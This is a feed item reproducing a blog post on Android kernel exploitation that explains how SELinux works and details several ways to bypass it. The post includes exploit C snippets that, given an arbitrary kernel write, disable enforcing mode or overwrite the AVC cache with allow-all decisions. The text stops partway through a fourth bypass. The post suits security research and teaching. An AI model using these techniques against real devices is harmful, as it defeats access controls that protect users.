    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Richard Hladík [<a href="https://arxiv.org/show-email/03852112/2311.11793">view email</a>]      <br>            <strong><a href="https://arxiv.org/abs/2311.11793v1">[v1]</a></strong>
        Mon, 20 Nov 2023 14:21:47 UTC (338 KB)<br>
    <strong>[v2]</strong>
        Tue, 9 Apr 2024 23:33:15 UTC (340 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[SELinux bypasses (150 pts)]]></title>
            <link>https://klecko.github.io/posts/selinux-bypasses/</link>
            <guid>41946453</guid>
            <pubDate>Fri, 25 Oct 2024 15:53:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://klecko.github.io/posts/selinux-bypasses/">https://klecko.github.io/posts/selinux-bypasses/</a>, See on <a href="https://news.ycombinator.com/item?id=41946453">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>This post aims at giving an overview of what SELinux is, how it is implemented, and how to bypass it, from the point of view of Android kernel exploitation.</p><p>Tests were performed on three devices: a Samsung Galaxy A34, a Huawei Mate 20 Pro, and a Xiaomi Redmi Note 12. We will focus mainly on the first two, because they have a hypervisor that will make privilege escalation and bypassing SELinux more difficult.</p><p>Code shown is from Linux kernel 5.15, with relevant notes for older versions in some cases.</p><h2 id="what-is-selinux"><span>What is SELinux</span><a href="#what-is-selinux"><i></i></a></h2><p>SELinux (Security-Enhanced Linux) is a Linux kernel <strong>security module</strong> that implements a <strong>Mandatory Access Control</strong> (MAC) mechanism to enforce a given <strong>security policy</strong>. Let’s break this down step by step.</p><h3 id="linux-security-module"><span>Linux Security Module</span><a href="#linux-security-module"><i></i></a></h3><p>Linux Security Modules (LSM) is a framework that allows defining modules that implement security checks. It mainly provides two things:</p><ul><li>It inserts a <strong>security</strong> field into some critical kernel data structures. This field is an opaque <code>void*</code> pointer that is managed by the modules. Some structs that have this field are <code>struct task_struct</code>, <code>struct cred</code>, <code>struct inode</code>, <code>struct file</code>, etc.</li><li>It inserts calls to <strong>hooks</strong> at critical points in the kernel code for modules to manage the security fields and to perform access control. SELinux hooks are defined <a href="https://elixir.bootlin.com/linux/v5.15.41/source/security/selinux/hooks.c#L7132">here</a>.<ul><li>For example, <a href="https://elixir.bootlin.com/linux/v5.15.41/source/fs/file_table.c#L96"><code>__alloc_file()</code></a>, which is the function responsible of allocating a <code>struct file</code>, calls <a href="https://elixir.bootlin.com/linux/v5.15.41/source/security/security.c#L1526"><code>security_file_alloc()</code></a>, which first allocates the <code>f_security</code> field <a href="https://elixir.bootlin.com/linux/v5.15.41/source/security/security.c#L572">here</a>, and then calls the <code>file_alloc_security</code> hooks to initialize it (e.g. <a href="https://elixir.bootlin.com/linux/v5.15.41/source/security/selinux/hooks.c#L3712"><code>selinux_file_alloc_security()</code></a>).</li><li>Another example: the <code>open</code> syscall ends up calling <code>do_dentry_open()</code>, which calls <code>security_file_open()</code> <a href="https://elixir.bootlin.com/linux/v5.15.41/source/fs/open.c#L809">here</a>. This function calls the <code>file_open</code> hooks, which are supposed to use the <code>f_security</code> field that was previously initialized to perform permission checks (e.g. <a href="https://elixir.bootlin.com/linux/v5.15.41/source/security/selinux/hooks.c#L4017"><code>selinux_file_open()</code></a>). If the check fails, the <code>open</code> syscall will return <code>-EACCES</code>.</li><li>Note that there may be multiple modules, each providing its own hook functions. Modules call <code>security_add_hooks()</code> on initialization (e.g. from <a href="https://elixir.bootlin.com/linux/v5.15.41/source/security/selinux/hooks.c#L7430"><code>selinux_init()</code></a>) to add their own hooks to the global <code>security_hook_heads</code>, which contains a list of functions for each type of hook. Macros <code>call_void_hook()</code> and <code>call_int_hook()</code> are used to call hooks, and they iterate the list that corresponds to the hook and call each function.</li></ul></li></ul><h3 id="mandatory-access-control"><span>Mandatory Access Control</span><a href="#mandatory-access-control"><i></i></a></h3><p>The usual permission system in Linux is <strong>Discretionary Access Control</strong> (DAC), where permissions rely solely on the user/group of each process, which is checked against the user, group and others permissions of each file. In addition, there’s the root user, which has permission to do everything.</p><p>In contrast, SELinux implements <strong>Mandatory Access Control</strong> (MAC), a more fine-grained permission system that checks permissions according to a predefined policy when doing any sensitive action with a file, socket, inode, binder object, etc. This allows giving each process only the minimum privilege level it needs to work. It also means that root access can’t do everything anymore, as it is bound to the <a href="#selinux-contexts">SELinux context</a> it is using.</p><h3 id="selinux-policy"><span>SELinux policy</span><a href="#selinux-policy"><i></i></a></h3><p>Some concepts:</p><ul><li>SELinux assigns a <strong>type</strong> to every object (files, processes, sockets, etc). For example, by default an app has the type <code>untrusted_app</code>. For a process, its type is also known as its <strong>domain</strong>.</li><li>It’s possible to assign <strong>attributes</strong> to a type, making it possible to refer to all types that have an attribute.</li><li>Objects are also mapped to <strong>classes</strong>, which indicates if they are a file, a process, a directory, etc.</li></ul><p><strong>SELinux contexts</strong> or <strong>labels</strong> have the format <code>user:role:type:sensitivity[:categories]</code>, with the type being the most important part. When running <code>id</code> from <code>adb shell</code>, it will show our context as <code>u:r:shell:s0</code>. However, when doing it from an app, it will show something like <code>u:r:untrusted_app:s0:c15,c256,c513,c768</code>. This determines our permissions. Files also have a label associated with them, and they can be printed if we add the <code>-Z</code> option to <code>ls</code>:</p><div file="Console"><p><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>$ ls -lZ /dev/mali0
crw-rw-rw- 1 system system u:object_r:gpu_device:s0 10, 114 2024-09-19 19:50 /dev/mali0
</pre></td></tr></tbody></table></code></p></div><p>SELinux hook functions check the requested permission against a <strong>policy</strong>. This policy defines what resources each process can access. It is made of <strong>rules</strong>, which come in the form: <code>allow source target:class permissions;</code>, where <em>source</em> and <em>target</em> are types or attributes. Here’s an example of a rule from a real device:</p><div><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>allow untrusted_app gpu_device:chr_file { append getattr ioctl lock map open read write };
</pre></td></tr></tbody></table></code></p></div><p>This rule says that processes with domain <code>untrusted_app</code> (which is the default for an Android app) can open, read, write, map, and perform ioctl on files of type <code>gpu_device</code>, such as the <code>/dev/mali0</code> file above, which is the character device for interacting with the Mali GPU driver. Note that by default, everything is denied unless there’s a rule that allows it.</p><p>Android SELinux policy is defined in the <a href="https://android.googlesource.com/platform/system/sepolicy/+/main"><code>system/sepolicy</code></a> repository and compiled to a binary file, which can be accessed in the device at <code>/sys/fs/selinux/policy</code>. That policy file can be easily inspected from the host. For example, to list everything accessible from untrusted app context:</p><div file="Console"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre>$ adb pull /sys/fs/selinux/policy policy
/sys/fs/selinux/policy: 1 file pulled, 0 skipped. 23.0 MB/s (1033355 bytes in 0.043s)
$ sesearch ./policy --allow -s untrusted_app
...
allow untrusted_app gpu_device:chr_file { append getattr ioctl lock map open read write };
...
</pre></td></tr></tbody></table></code></p></div><h3 id="example-denial"><span>Example denial</span><a href="#example-denial"><i></i></a></h3><p>The following is an example of what is logged to logcat when trying to do some action for which we don’t have permission. In this case, my exploit had successfully replaced my process creds with <code>init_cred</code>, and I was ready to drop a root shell. However, despite being root user with all capabilities, I was not allowed to execute <code>/system/bin/sh</code>. As the log message says, a process with context of type <code>kernel</code> (the one assigned to <code>init_cred</code>) is not allowed to execute a file with context of type <code>shell_exec</code>.</p><blockquote><p><code> 12487 12487 W /data/local/tmp/exploit: type=1400 audit(0.0:1975): avc: denied { execute } for comm=exploit name="sh" dev="dm-8" ino=9289095 scontext=u:r:kernel:s0 tcontext=u:object_r:shell_exec:s0 tclass=file permissive=0 </code></p></blockquote><p>Therefore, a SELinux bypass is needed to get unrestricted root access to the device.</p><h2 id="implementation-overview"><span>Implementation overview</span><a href="#implementation-overview"><i></i></a></h2><p>SELinux permission checks are done in <code>avc_has_perm_noaudit()</code>. Every permission check hook ends up calling this function with a pointer to the global <code>selinux_state</code> as first argument. This function checks whether permissions <code>requested</code> are granted for an object of type <code>ssid</code> operating on an object of type <code>tsid</code> and class <code>tclass</code>, and stores the result in <code>avd</code>. Let’s see how it is implemented.</p><div file="security/selinux/avc.c"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre></td><td><pre><span>inline</span> <span>int</span> <span>avc_has_perm_noaudit</span><span>(</span><span>struct</span> <span>selinux_state</span> <span>*</span><span>state</span><span>,</span>
				<span>u32</span> <span>ssid</span><span>,</span> <span>u32</span> <span>tsid</span><span>,</span>
				<span>u16</span> <span>tclass</span><span>,</span> <span>u32</span> <span>requested</span><span>,</span>
				<span>unsigned</span> <span>int</span> <span>flags</span><span>,</span>
				<span>struct</span> <span>av_decision</span> <span>*</span><span>avd</span><span>)</span>
<span>{</span>
	<span>struct</span> <span>avc_node</span> <span>*</span><span>node</span><span>;</span>
	<span>struct</span> <span>avc_xperms_node</span> <span>xp_node</span><span>;</span>
	<span>int</span> <span>rc</span> <span>=</span> <span>0</span><span>;</span>
	<span>u32</span> <span>denied</span><span>;</span>

	<span>if</span> <span>(</span><span>WARN_ON</span><span>(</span><span>!</span><span>requested</span><span>))</span>
		<span>return</span> <span>-</span><span>EACCES</span><span>;</span>

	<span>rcu_read_lock</span><span>();</span>

	<span>node</span> <span>=</span> <span>avc_lookup</span><span>(</span><span>state</span><span>-&gt;</span><span>avc</span><span>,</span> <span>ssid</span><span>,</span> <span>tsid</span><span>,</span> <span>tclass</span><span>);</span>
	<span>if</span> <span>(</span><span>unlikely</span><span>(</span><span>!</span><span>node</span><span>))</span>
		<span>node</span> <span>=</span> <span>avc_compute_av</span><span>(</span><span>state</span><span>,</span> <span>ssid</span><span>,</span> <span>tsid</span><span>,</span> <span>tclass</span><span>,</span> <span>avd</span><span>,</span> <span>&amp;</span><span>xp_node</span><span>);</span>
	<span>else</span>
		<span>memcpy</span><span>(</span><span>avd</span><span>,</span> <span>&amp;</span><span>node</span><span>-&gt;</span><span>ae</span><span>.</span><span>avd</span><span>,</span> <span>sizeof</span><span>(</span><span>*</span><span>avd</span><span>));</span>

	<span>denied</span> <span>=</span> <span>requested</span> <span>&amp;</span> <span>~</span><span>(</span><span>avd</span><span>-&gt;</span><span>allowed</span><span>);</span>
	<span>if</span> <span>(</span><span>unlikely</span><span>(</span><span>denied</span><span>))</span>
		<span>rc</span> <span>=</span> <span>avc_denied</span><span>(</span><span>state</span><span>,</span> <span>ssid</span><span>,</span> <span>tsid</span><span>,</span> <span>tclass</span><span>,</span> <span>requested</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span>
				<span>flags</span><span>,</span> <span>avd</span><span>);</span>

	<span>rcu_read_unlock</span><span>();</span>
	<span>return</span> <span>rc</span><span>;</span>
<span>}</span>

<span>static</span> <span>noinline</span>
<span>struct</span> <span>avc_node</span> <span>*</span><span>avc_compute_av</span><span>(</span><span>struct</span> <span>selinux_state</span> <span>*</span><span>state</span><span>,</span>
				<span>u32</span> <span>ssid</span><span>,</span> <span>u32</span> <span>tsid</span><span>,</span>
				<span>u16</span> <span>tclass</span><span>,</span> <span>struct</span> <span>av_decision</span> <span>*</span><span>avd</span><span>,</span>
				<span>struct</span> <span>avc_xperms_node</span> <span>*</span><span>xp_node</span><span>)</span>
<span>{</span>
	<span>rcu_read_unlock</span><span>();</span>
	<span>INIT_LIST_HEAD</span><span>(</span><span>&amp;</span><span>xp_node</span><span>-&gt;</span><span>xpd_head</span><span>);</span>
	<span>security_compute_av</span><span>(</span><span>state</span><span>,</span> <span>ssid</span><span>,</span> <span>tsid</span><span>,</span> <span>tclass</span><span>,</span> <span>avd</span><span>,</span> <span>&amp;</span><span>xp_node</span><span>-&gt;</span><span>xp</span><span>);</span>
	<span>rcu_read_lock</span><span>();</span>
	<span>return</span> <span>avc_insert</span><span>(</span><span>state</span><span>-&gt;</span><span>avc</span><span>,</span> <span>ssid</span><span>,</span> <span>tsid</span><span>,</span> <span>tclass</span><span>,</span> <span>avd</span><span>,</span> <span>xp_node</span><span>);</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><p>First, it calls <code>avc_lookup()</code> to check if that permission check has been computed before and is in the cache. If not, it calls <code>avc_compute_av()</code>, which computes the permission check with <code>security_compute_av()</code> and then inserts it into the cache with <code>avc_insert()</code>. Finally, if the permission request is denied, it returns the result of <code>avc_denied()</code>, which can be 0 (granted) or <code>-EACCES</code> (denied).</p><h2 id="bypasses"><span>Bypasses</span><a href="#bypasses"><i></i></a></h2><p>Let’s explore different bypasses from an exploit development perspective, assuming an arbitrary write memory primitive. Some notes about why each bypass works or doesn’t work on my devices are included.</p><p>Code above shows three different ways to attack SELinux: we can attack the cache (<code>avc_lookup()</code>), we can attack the permission computation (<code>security_compute_av()</code>), or we can attack <code>avc_denied()</code>, which may allow the action even if the permission check was denied.</p><h3 id="bypass-1-disable-selinux"><span>Bypass 1: Disable SELinux</span><a href="#bypass-1-disable-selinux"><i></i></a></h3><p>If we inspect the code of <code>avc_denied()</code>, which is called when a permission check has failed, we can see it can still return 0 instead of <code>-EACCES</code> if <code>state-&gt;enforcing</code> is false.</p><div file="security/selinux/avc.c"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td><pre><span>static</span> <span>noinline</span> <span>int</span> <span>avc_denied</span><span>(</span><span>struct</span> <span>selinux_state</span> <span>*</span><span>state</span><span>,</span>
			       <span>u32</span> <span>ssid</span><span>,</span> <span>u32</span> <span>tsid</span><span>,</span>
			       <span>u16</span> <span>tclass</span><span>,</span> <span>u32</span> <span>requested</span><span>,</span>
			       <span>u8</span> <span>driver</span><span>,</span> <span>u8</span> <span>xperm</span><span>,</span> <span>unsigned</span> <span>int</span> <span>flags</span><span>,</span>
			       <span>struct</span> <span>av_decision</span> <span>*</span><span>avd</span><span>)</span>
<span>{</span>
	<span>if</span> <span>(</span><span>flags</span> <span>&amp;</span> <span>AVC_STRICT</span><span>)</span>
		<span>return</span> <span>-</span><span>EACCES</span><span>;</span>

	<span>if</span> <span>(</span><span>enforcing_enabled</span><span>(</span><span>state</span><span>)</span> <span>&amp;&amp;</span>
	    <span>!</span><span>(</span><span>avd</span><span>-&gt;</span><span>flags</span> <span>&amp;</span> <span>AVD_FLAGS_PERMISSIVE</span><span>))</span>
		<span>return</span> <span>-</span><span>EACCES</span><span>;</span>

	<span>avc_update_node</span><span>(</span><span>state</span><span>-&gt;</span><span>avc</span><span>,</span> <span>AVC_CALLBACK_GRANT</span><span>,</span> <span>requested</span><span>,</span> <span>driver</span><span>,</span>
			<span>xperm</span><span>,</span> <span>ssid</span><span>,</span> <span>tsid</span><span>,</span> <span>tclass</span><span>,</span> <span>avd</span><span>-&gt;</span><span>seqno</span><span>,</span> <span>NULL</span><span>,</span> <span>flags</span><span>);</span>
	<span>return</span> <span>0</span><span>;</span>
<span>}</span>

<span>static</span> <span>inline</span> <span>bool</span> <span>enforcing_enabled</span><span>(</span><span>struct</span> <span>selinux_state</span> <span>*</span><span>state</span><span>)</span>
<span>{</span>
	<span>return</span> <span>READ_ONCE</span><span>(</span><span>state</span><span>-&gt;</span><span>enforcing</span><span>);</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><p>Therefore, the simplest way to bypass SELinux would be to set <code>state-&gt;enforcing</code> to false. This sets SELinux to permissive state, in which permission denials are logged but not enforced.</p><p>In Linux 5.15, the definition of <code>struct selinux_state</code> is as follows:</p><div file="security/selinux/include/security.h"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td><pre><span>struct</span> <span>selinux_state</span> <span>{</span>
<span>#ifdef CONFIG_SECURITY_SELINUX_DISABLE
</span>	<span>bool</span> <span>disabled</span><span>;</span>
<span>#endif
#ifdef CONFIG_SECURITY_SELINUX_DEVELOP
</span>	<span>bool</span> <span>enforcing</span><span>;</span>
<span>#endif
</span>	<span>bool</span> <span>checkreqprot</span><span>;</span>
	<span>bool</span> <span>initialized</span><span>;</span>
	<span>bool</span> <span>policycap</span><span>[</span><span>__POLICYDB_CAPABILITY_MAX</span><span>];</span>

	<span>struct</span> <span>page</span> <span>*</span><span>status_page</span><span>;</span>
	<span>struct</span> <span>mutex</span> <span>status_lock</span><span>;</span>

	<span>struct</span> <span>selinux_avc</span> <span>*</span><span>avc</span><span>;</span>
	<span>struct</span> <span>selinux_policy</span> <span>__rcu</span> <span>*</span><span>policy</span><span>;</span>
	<span>struct</span> <span>mutex</span> <span>policy_mutex</span><span>;</span>
<span>}</span> <span>__randomize_layout</span><span>;</span>
</pre></td></tr></tbody></table></code></p></div><p><code>CONFIG_SECURITY_SELINUX_DISABLE</code> is usually not enabled while <code>CONFIG_SECURITY_SELINUX_DEVELOP</code> is, so <code>enforcing</code> is at offset 0. Therefore, this bypass would be:</p><div file="exploit.c"><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>kwrite8</span><span>(</span><span>selinux_state_addr</span><span>,</span> <span>0</span><span>);</span>
</pre></td></tr></tbody></table></code></p></div><blockquote><p>On newer Linux versions (6.6), the <code>disabled</code> field in <code>selinux_state</code> has been completely removed. On older versions (4.19, 5.4), instead, the <code>disabled</code> field was always present, so the <code>enforcing</code> field would be at offset 1. On even older versions (4.14), there was no <code>selinux_state</code>, and its <code>enforcing</code> field corresponded to the global <code>selinux_enforcing</code>.</p></blockquote><p>You may wonder why we need more bypasses if this just works. The reason is that manufacturers like Samsung or Huawei are building hypervisors that run at higher privilege than the kernel and that try to block privilege escalation attempts by protecting critical kernel memory and marking it as read-only. This includes the SELinux state global variables. On other devices, <code>CONFIG_SECURITY_SELINUX_DEVELOP</code> is disabled, so the <code>enforcing</code> field is removed and SELinux can’t actually be set to permissive state.</p><blockquote><p>In my Samsung device, <code>selinux_enforcing</code> is protected by the <a href="https://blog.longterm.io/samsung_rkp.html#protecting-kernel-data">hypervisor</a>, so we can’t write to it.</p><div file="security/selinux/hooks.c on Samsung"><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>int</span> <span>selinux_enforcing</span> <span>__kdp_ro_aligned</span><span>;</span>
</pre></td></tr></tbody></table></code></p></div><p>My Huawei device, on the other hand, doesn’t define <code>CONFIG_SECURITY_SELINUX_DEVELOP</code>, and thus defines <code>selinux_enforcing</code> as 1.</p><div file="security/selinux/include/avc.h on Huawei"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>#ifdef CONFIG_SECURITY_SELINUX_DEVELOP
</span><span>extern</span> <span>int</span> <span>selinux_enforcing</span><span>;</span>
<span>#else
#define selinux_enforcing 1
#endif
</span></pre></td></tr></tbody></table></code></p></div></blockquote><h3 id="bypass-2-overwrite-permissive-map"><span>Bypass 2: Overwrite permissive map</span><a href="#bypass-2-overwrite-permissive-map"><i></i></a></h3><p>If we take a look at the code of <code>avc_denied()</code> shown before, it also returns 0 if <code>avd-&gt;flags &amp; AVD_FLAGS_PERMISSIVE</code>. This <code>avd</code> is populated in <code>security_compute_av()</code>, and that flag is added if the bit in <code>policydb-&gt;permissive_map</code> corresponding to the source type is set:</p><div file="security/selinux/ss/services.c"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
</pre></td><td><pre><span>void</span> <span>security_compute_av</span><span>([...],</span> <span>struct</span> <span>av_decision</span> <span>*</span><span>avd</span><span>,</span> <span>[...])</span> <span>{</span>
	<span>[...]</span>
	<span>/* permissive domain? */</span>
	<span>if</span> <span>(</span><span>ebitmap_get_bit</span><span>(</span><span>&amp;</span><span>policydb</span><span>-&gt;</span><span>permissive_map</span><span>,</span> <span>scontext</span><span>-&gt;</span><span>type</span><span>))</span>
		<span>avd</span><span>-&gt;</span><span>flags</span> <span>|=</span> <span>AVD_FLAGS_PERMISSIVE</span><span>;</span>
	<span>[...]</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><p>Therefore, if we overwrite this <code>permissive_map</code> and set all bits, the effect would be similar to setting SELinux to permissive mode.</p><blockquote><p>However, Samsung and Huawei devices present some problems with this approach:</p><ul><li>On my Samsung device, <code>AVD_FLAGS_PERMISSIVE</code> is defined as 0, so it is ignored.</li><li>On my Huawei device, <code>permissive_map</code> is allocated from <a href="https://blog.impalabs.com/2212_huawei-security-hypervisor.html#selinux-protection">selinux_pool</a>, a memory pool that is made read-only from the hypervisor after loading the security policy, so we can’t overwrite it.</li></ul></blockquote><h3 id="bypass-3-overwrite-avc-cache"><span>Bypass 3: Overwrite AVC cache</span><a href="#bypass-3-overwrite-avc-cache"><i></i></a></h3><p>Function <code>avc_has_perm_noaudit()</code> calls <code>avc_lookup()</code> to check if that permission check has been computed before and is in the cache, which ends up calling <code>avc_search_node()</code>. The returned node, if found, would indicate the allowed permissions for an object of type <code>ssid</code> operating of an object of type <code>tsid</code> and class <code>tclass</code>.</p><div file="security/selinux/avc.c"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td><pre><span>static</span> <span>inline</span> <span>struct</span> <span>avc_node</span> <span>*</span><span>avc_search_node</span><span>(</span><span>struct</span> <span>selinux_avc</span> <span>*</span><span>avc</span><span>,</span>
					       <span>u32</span> <span>ssid</span><span>,</span> <span>u32</span> <span>tsid</span><span>,</span> <span>u16</span> <span>tclass</span><span>)</span>
<span>{</span>
	<span>struct</span> <span>avc_node</span> <span>*</span><span>node</span><span>,</span> <span>*</span><span>ret</span> <span>=</span> <span>NULL</span><span>;</span>
	<span>int</span> <span>hvalue</span><span>;</span>
	<span>struct</span> <span>hlist_head</span> <span>*</span><span>head</span><span>;</span>

	<span>hvalue</span> <span>=</span> <span>avc_hash</span><span>(</span><span>ssid</span><span>,</span> <span>tsid</span><span>,</span> <span>tclass</span><span>);</span>
	<span>head</span> <span>=</span> <span>&amp;</span><span>avc</span><span>-&gt;</span><span>avc_cache</span><span>.</span><span>slots</span><span>[</span><span>hvalue</span><span>];</span>
	<span>hlist_for_each_entry_rcu</span><span>(</span><span>node</span><span>,</span> <span>head</span><span>,</span> <span>list</span><span>)</span> <span>{</span>
		<span>if</span> <span>(</span><span>ssid</span> <span>==</span> <span>node</span><span>-&gt;</span><span>ae</span><span>.</span><span>ssid</span> <span>&amp;&amp;</span>
		    <span>tclass</span> <span>==</span> <span>node</span><span>-&gt;</span><span>ae</span><span>.</span><span>tclass</span> <span>&amp;&amp;</span>
		    <span>tsid</span> <span>==</span> <span>node</span><span>-&gt;</span><span>ae</span><span>.</span><span>tsid</span><span>)</span> <span>{</span>
			<span>ret</span> <span>=</span> <span>node</span><span>;</span>
			<span>break</span><span>;</span>
		<span>}</span>
	<span>}</span>

	<span>return</span> <span>ret</span><span>;</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><p>As can be seen, the <code>avc_cache</code> has a hash table of <code>avc_node</code>s. It first calculates the slot or bucket by hashing the <code>ssid</code>, <code>tsid</code> and <code>tclass</code> together, and then iterates that slot looking for the exact match. From the returned node, what is interesting to us is the field <code>node-&gt;ae.avd.allowed</code>, whose bits indicate which permissions are allowed. If we iterate every node in the <code>avc_cache</code> and overwrite that field with <code>0xFFFFFFFF</code>, every permission check that was previously cached would now succeed.</p><div file="security/selinux/avc.c"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td><pre><span>struct</span> <span>avc_cache</span> <span>{</span>
	<span>struct</span> <span>hlist_head</span>	<span>slots</span><span>[</span><span>AVC_CACHE_SLOTS</span><span>];</span> <span>/* head for avc_node-&gt;list */</span>
	<span>[...]</span>
<span>};</span>

<span>struct</span> <span>avc_node</span> <span>{</span>
	<span>struct</span> <span>avc_entry</span>	<span>ae</span><span>;</span>
	<span>struct</span> <span>hlist_node</span>	<span>list</span><span>;</span> <span>/* anchored in avc_cache-&gt;slots[i] */</span>
	<span>[...]</span>
<span>};</span>

<span>struct</span> <span>avc_entry</span> <span>{</span>
	<span>u32</span>			<span>ssid</span><span>;</span>
	<span>u32</span>			<span>tsid</span><span>;</span>
	<span>u16</span>			<span>tclass</span><span>;</span>
	<span>struct</span> <span>av_decision</span>	<span>avd</span><span>;</span>
	<span>struct</span> <span>avc_xperms_node</span>	<span>*</span><span>xp_node</span><span>;</span>
<span>};</span>
</pre></td></tr></tbody></table></code></p></div><div file="security/selinux/include/security.h"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
</pre></td><td><pre><span>struct</span> <span>av_decision</span> <span>{</span>
	<span>u32</span> <span>allowed</span><span>;</span>
	<span>u32</span> <span>auditallow</span><span>;</span>
	<span>u32</span> <span>auditdeny</span><span>;</span>
	<span>u32</span> <span>seqno</span><span>;</span>
	<span>u32</span> <span>flags</span><span>;</span>
<span>};</span>
</pre></td></tr></tbody></table></code></p></div><p>Therefore, the bypass would look something like this:</p><div file="exploit.c"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td><pre><span>#define AVC_CACHE_SLOTS 512
#define AVC_DECISION_ALLOWALL 0xffffffff
</span>
<span>void</span> <span>overwrite_avc_cache</span><span>(</span><span>uint64_t</span> <span>avc_cache_addr</span><span>)</span> <span>{</span>
	<span>for</span> <span>(</span><span>size_t</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>AVC_CACHE_SLOTS</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
		<span>uint64_t</span> <span>avc_cache_slot_list</span> <span>=</span> <span>kread64</span><span>(</span><span>avc_cache_addr</span> <span>+</span> <span>i</span><span>*</span><span>sizeof</span><span>(</span><span>uint64_t</span><span>));</span>
		<span>while</span> <span>(</span><span>avc_cache_slot_list</span><span>)</span> <span>{</span>
			<span>uint64_t</span> <span>avc_decision_addr</span> <span>=</span> <span>avc_cache_slot_list</span> <span>-</span> <span>0x1c</span><span>;</span>
			<span>kwrite32</span><span>(</span><span>avc_decision_addr</span><span>,</span> <span>AVC_DECISION_ALLOWALL</span><span>);</span>
			<span>avc_cache_slot_list</span> <span>=</span> <span>kread64</span><span>(</span><span>avc_cache_slot_list</span><span>);</span>
		<span>}</span>
	<span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><p>The <code>avc_cache</code> is embedded inside the global <code>selinux_avc</code>, alongside <code>avc_cache_threshold</code>.</p><div file="security/selinux/avc.c"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span>struct</span> <span>selinux_avc</span> <span>{</span>
	<span>unsigned</span> <span>int</span> <span>avc_cache_threshold</span><span>;</span>
	<span>struct</span> <span>avc_cache</span> <span>avc_cache</span><span>;</span>
<span>};</span>

<span>static</span> <span>struct</span> <span>selinux_avc</span> <span>selinux_avc</span><span>;</span>
</pre></td></tr></tbody></table></code></p></div><p>This <code>avc_cache_threshold</code> is used in <code>avc_alloc_node()</code> to determine if the AVC cache should be trimmed.</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td><pre><span>static</span> <span>struct</span> <span>avc_node</span> <span>*</span><span>avc_alloc_node</span><span>(</span><span>struct</span> <span>selinux_avc</span> <span>*</span><span>avc</span><span>)</span>
<span>{</span>
	<span>struct</span> <span>avc_node</span> <span>*</span><span>node</span><span>;</span>
	<span>[...]</span>
	<span>if</span> <span>(</span><span>atomic_inc_return</span><span>(</span><span>&amp;</span><span>avc</span><span>-&gt;</span><span>avc_cache</span><span>.</span><span>active_nodes</span><span>)</span> <span>&gt;</span>
	    <span>avc</span><span>-&gt;</span><span>avc_cache_threshold</span><span>)</span>
		<span>avc_reclaim_node</span><span>(</span><span>avc</span><span>);</span>
<span>out:</span>
	<span>return</span> <span>node</span><span>;</span>
<span>}</span>
</pre></td></tr></tbody></table></code></p></div><p>If we don’t want the modified nodes to be ever removed from the cache, we can write <code>0xFFFFFFFF</code> to that field.</p><blockquote><p>On older Linux versions (4.14), the AVC cache and its threshold are defined as global variables <code>avc_cache</code> and <code>avc_cache_threshold</code>, instead of being embedded into global <code>selinux_avc</code>.</p></blockquote><p>Note that this only modifies permission checks that have been already computed and cached. Therefore, we can’t just allow everything by default. Instead, the workflow would be to perform some action for which we don’t have permission, let it fail, overwrite the AVC cache, and then perform it again, this time succeeding.</p><p>This bypass was used <a href="https://github.com/chompie1337/s8_2019_2215_poc/blob/master/poc/selinux_bypass.c#L446">here</a> by chompie1337. She implemented the aforementioned workflow in order to load a new SELinux policy. Therefore, she only needed to overwrite the AVC cache at most twice (to <code>open</code> and <code>write</code> on <code>/sys/fs/selinux/load</code>). After that, the injected SELinux policy takes effect, which can contain rules to allow any action.</p><blockquote><p>This doesn’t work on my Huawei device. As noted <a href="https://blog.impalabs.com/2212_huawei-security-hypervisor.html#selinux-protection">here</a>, SELinux data structures are allocated from a memory pool that is later made read-only, making loading a new policy impossible. The AVC cache is not allocated from that memory pool, so it can still be overwritten. But without any other more consistent mechanism to disable SELinux, this is pretty much useless. I have not tested policy reloading on my Samsung device.</p></blockquote><h3 id="bypass-4-selinux-initialization"><span>Bypass 4: SELinux initialization</span><a href="#bypass-4-selinux-initialization"><i></i></a></h3><p>Let’s check the implementation of <code>security_compute_av()</code>, the function in charge of actually computing a permission check in case it wasn’t in the cache.</p><div file="security/selinux/ss/services.c"><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td><pre><span>void</span> <span>security_compute_av</span><span>(</span><span>struct</span> <span>selinux_state</span> <span>*</span><span>state</span><span>,</span>
			 <span>u32</span> <span>ssid</span><span>,</span>
			 <span>u32</span> <span>tsid</span><span>,</span>
